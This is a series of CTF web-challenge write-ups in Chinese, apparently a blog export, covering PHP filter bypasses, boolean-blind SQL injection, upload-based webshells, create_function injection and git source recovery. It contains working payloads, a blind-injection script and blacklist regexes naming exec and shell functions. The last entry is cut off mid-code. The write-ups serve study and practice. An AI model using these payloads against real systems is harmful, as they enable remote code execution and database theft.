    <title>红明谷杯CTF2021-wtite_shell</title>
    <url>/2022/04/08/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFCTF2021-wtite-shell/</url>
    <content><![CDATA[<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们需要指定参数然后写入文件到指定路径的index.php文件中</p>
<p>题目非常人性的给出了pwd来查看上传文件的路径</p>
<p>写入的文件需要经过一层过滤也就是说总体而言就是要绕过php以及eval的执行，</p>
<?php可以用<?=替代空格用\t替代，然后执行命令的话直接用反撇号包裹系统命令即可；

payload:

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">action=upload&amp;data=&lt;?=%09`cat%09/flllllll1112222222lag`?&gt;</span><br></pre></td></tr></table>

]]></content>
      <tags>
        <tag>红明谷杯2021</tag>
      </tags>
  </entry>
  <entry>
    <title>颜值成绩查询</title>
    <url>/2022/04/01/%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/</url>
    <content><![CDATA[<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>先看一下题目，直接是查询框</p>
<p>输入1，2，3，4的时候有回显，以上回显<code>student number not exists.</code></p>
<p>输入0的时候测试一下，发现输入一般语句都不行，但是可以输入1^1^1这样中间插入语句可以执行，好像直接输入判断语句当语句正确的时候也会正确会先</p>
<p>两种不同页面，bool盲注直接构造语句就可以了，写完了直接在网上找一个二分法套进去就行了</p>
<p>附上脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://4b551773-8868-4744-bbac-3092b1c7f657.node4.buuoj.cn:81/?stunum=&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>( <span class="literal">True</span> ):</span><br><span class="line">	i = i + <span class="number">1</span> </span><br><span class="line">	head=<span class="number">32</span></span><br><span class="line">	tail=<span class="number">127</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>( head &lt; tail ):</span><br><span class="line">		mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,0)&quot; % (i , mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d,1,0)&quot;  % (i , mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),%d,1))&gt;%d,1,0)&quot;  % (i , mid)</span></span><br><span class="line">		payload = <span class="string">&quot;if(ascii(substr((select/**/group_concat(value)from(flag)),%d,1))&gt;%d,1,0)&quot;</span>  % (i , mid)</span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">		<span class="comment">#print(url+payload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;your score is: 100&quot;</span> <span class="keyword">in</span> r.text :</span><br><span class="line">			head = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print(r.text)</span></span><br><span class="line">			tail = mid</span><br><span class="line">	</span><br><span class="line">	last = result</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> head!=<span class="number">32</span>:</span><br><span class="line">		result += <span class="built_in">chr</span>(head)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WUSTCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>CV-Maker</title>
    <url>/2022/04/09/CV-Maker/</url>
    <content><![CDATA[<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>题目不是很难，一个简单的文件上传，文件上传点也非常好找</p>
<p>先注册登录进去</p>
<p>然后页面就是一个设置上传头像的地方了</p>
<p>只有一个小小的图片头伪造</p>
<p>GIF89a就可以绕过</p>
<p>直接写入一句话</p>
<p>需要找到的就是上传的目录了</p>
<p>查看了一下源码发现</p>
<p><img src="/2022/04/09/CV-Maker/1.png" alt="1"></p>
<p>上传目录也给出来了</p>
<p>直接进入然后RCE就行没有任何问题</p>
]]></content>
      <tags>
        <tag>WUSTCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020_EzPHP</title>
    <url>/2022/04/12/BJDCTF2020-EzPHP/</url>
    <content><![CDATA[<h2 id="BJDCTF2020-EzPHP"><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2><p>在页面源码发现提示</p>
<p>base32解密：<code>1nD3x.php</code></p>
<p>访问页面拿到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;1nD3x.php&quot;</span>;</span><br><span class="line"><span class="variable">$shana</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shana&#x27;</span>];</span><br><span class="line"><span class="variable">$passwd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])<span class="comment">#查询字符串</span></span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;<span class="comment">#如果不是http协议</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; <span class="comment">#需要匹配debu但是$符号匹配的是句尾的换行符debu=aqua_is_cute%0a</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; <span class="comment">#遍历传入参数，不能有英文字母</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)<span class="comment">#如果拿到的文件的内容不是debu_debu_aqua输出下列语句退出</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;<span class="comment">#数组对比变量覆盖</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);<span class="comment">#对arg以及code进行变量覆盖？</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一步步分析</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>) &#123; </span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>])<span class="comment">#查询字符串</span></span><br><span class="line">        )  </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;You seem to want to do something bad?&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断查询字符串不能有以上字符否则直接退出</p>
<p>这里是直接拿到我们的输入内容，可以直接用urlencode编码一下直接绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;<span class="comment">#如果不是http协议</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;debu&#x27;</span>] !== <span class="string">&#x27;aqua_is_cute&#x27;</span>) &#123; <span class="comment">#需要匹配debu但是$符号匹配的是句尾的换行符debu=aqua_is_cute%0a</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>传入的file不能是http/s协议，然后会对debu进行一次正则匹配需要满足正则而又不能全等与<code>aqua_is_cute</code>：$判尾的判定：判定的是结束的换行符</p>
<p>这里的debu可以通过<code>aqua_is_cute%0a</code>的形式绕过，将这里的file覆盖，至于file是什么这里还没有提到，接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123; <span class="comment">#遍历传入参数，不能有英文字母</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))  </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;fxck you! I hate English!&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>他判定我们输入的参数不能有英文字母，但是根据他的特性我们知道，$_REQUEST如果同时传入GET、POST的话，POST的优先级是大于GET传入的参数的，所以我们只需要将不是数组的参数用post同时传入一个数字就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>) !== <span class="string">&#x27;debu_debu_aqua&#x27;</span>)<span class="comment">#如果拿到的文件的内容不是debu_debu_aqua输出下列语句退出</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>用到了file，可以用data伪协议来传入我们想要的数据<code>data://text/plain,debu_debu_aqua</code></p>
<p>进入到下面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( sha1(<span class="variable">$shana</span>) === sha1(<span class="variable">$passwd</span>) &amp;&amp; <span class="variable">$shana</span> != <span class="variable">$passwd</span> )&#123;<span class="comment">#数组对比变量覆盖</span></span><br><span class="line">    extract(<span class="variable">$_GET</span>[<span class="string">&quot;flag&quot;</span>]);<span class="comment">#对arg以及code进行变量覆盖？</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sha1绕过很简单，他无法处理数组，所以直接构造数组变量就行</p>
<p>下面提供了变量覆盖，接着往下看</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="variable">$code</span>) || </span><br><span class="line">preg_match(<span class="string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="variable">$arg</span>) ) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$code</span>(<span class="string">&#x27;&#x27;</span>, <span class="variable">$arg</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>因为code刚开始给的是空字符串，那么上面的变量覆盖就是覆盖这两个变量了</p>
<p>结合下面可以利用的<code>$code(&#39;&#39;, $arg); </code></p>
<p>想到可以利用<code>create_function</code></p>
<p>然后构造闭合就可以在外边执行我们的语句</p>
<p>所以需要构造<code>flag[code]=create_function&amp;flag[arg]=&#125;构造语句//</code></p>
<p>我们可以先看一下<code>get_defined_vars — 返回由所有已定义变量所组成的数组 </code></p>
<p>先读一下里面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=%<span class="number">64</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F%<span class="number">74</span>%<span class="number">65</span>%<span class="number">78</span>%<span class="number">74</span>%<span class="number">2</span>F%<span class="number">70</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">69</span>%<span class="number">6</span>E%<span class="number">2</span>C%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>F%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>%<span class="number">5</span>F%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>&amp;%<span class="number">64</span>%<span class="number">65</span>%<span class="number">62</span>%<span class="number">75</span>=%<span class="number">61</span>%<span class="number">71</span>%<span class="number">75</span>%<span class="number">61</span>%<span class="number">5</span>F%<span class="number">69</span>%<span class="number">73</span>%<span class="number">5</span>F%<span class="number">63</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">0</span>a&amp;%<span class="number">73</span>%<span class="number">68</span>%<span class="number">61</span>%<span class="number">6</span>E%<span class="number">61</span>[]=<span class="number">1</span>&amp;%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">64</span>[]=<span class="number">2</span>&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">63</span>%<span class="number">6</span>F%<span class="number">64</span>%<span class="number">65</span>]=%<span class="number">63</span>%<span class="number">72</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>_%<span class="number">66</span>%<span class="number">75</span>%<span class="number">6</span>E%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>F%<span class="number">6</span>E&amp;%<span class="number">66</span>%<span class="number">6</span>C%<span class="number">61</span>%<span class="number">67</span>[%<span class="number">61</span>%<span class="number">72</span>%<span class="number">67</span>]=&#125;var_dump(get_defined_vars());<span class="comment">//</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/12/BJDCTF2020-EzPHP/1.png" alt="1"></p>
<p>发现flag页面<code>rea1fl4g.php</code></p>
<p>直接访问看看</p>
<p><code>咦，你居然找到我了？！不过看到这句话也不代表你就能拿到flag哦！</code>垃圾信息，那么我们可以构造伪协议直接读取他的页面源码</p>
<p>还是在arg位置，因为inc被ban了所以include不能用可以用require</p>
<p>因为需要用到伪协议，而arg有很多过滤，所以我们用取反绕过一下</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&amp;%73%68%61%6E%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6C%61%67[%63%6F%64%65]=%63%72%65%61%74%65_%66%75%6E%63%74%69%6F%6E&amp;%66%6C%61%67[%61%72%67]=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//</span><br><span class="line"></span><br><span class="line">post:file=1&amp;debu=1</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>BJDCTF2020</tag>
      </tags>
  </entry>
  <entry>
    <title>Comment</title>
    <url>/2022/04/09/Comment/</url>
    <content><![CDATA[<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>进入是像是一个留言板</p>
<p>需要登录</p>
<p><img src="/2022/04/09/Comment/1.png" alt="1"></p>
<p>直接爆破后三位就行，爆出密码666</p>
<p>登录进去</p>
<p>扫描的时候发现git文件泄露</p>
<p>直接用GitHack下载源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现好像没有什么用啊</p>
<p>也没什么有价值的信息</p>
<p>在查看页面的时候发现在控制台处有个提示：</p>
<p><img src="/2022/04/09/Comment/2.png" alt="1"></p>
<p>意识到git可能不全，需要恢复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg log --relog</span><br><span class="line"></span><br><span class="line">commit e5b2a2443c2b6d395d06960123142bc91123148c (refs/stash)</span><br><span class="line">Merge: bfbdf21 5556e3a</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    WIP on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit 5556e3ad3f21a0cf5938e26985a04ce3aa73faaf</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:51:17 2018 +0800</span><br><span class="line"></span><br><span class="line">    index on master: bfbdf21 add write_do.php</span><br><span class="line"></span><br><span class="line">commit bfbdf218902476c5c6164beedd8d2fcf593ea23b (HEAD -&gt; master)</span><br><span class="line">Author: root &lt;root@localhost.localdomain&gt;</span><br><span class="line">Date:   Sat Aug 11 22:47:29 2018 +0800</span><br><span class="line"></span><br><span class="line">    add write_do.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现我们现在是修改过的，需要恢复到未修改的状态<code>e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
<p><code>git reset --harf e5b2a2443c2b6d395d06960123142bc91123148c</code></p>
<p>然后再打开文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    <span class="variable">$category</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    <span class="variable">$title</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    <span class="variable">$content</span> = addslashes(<span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span 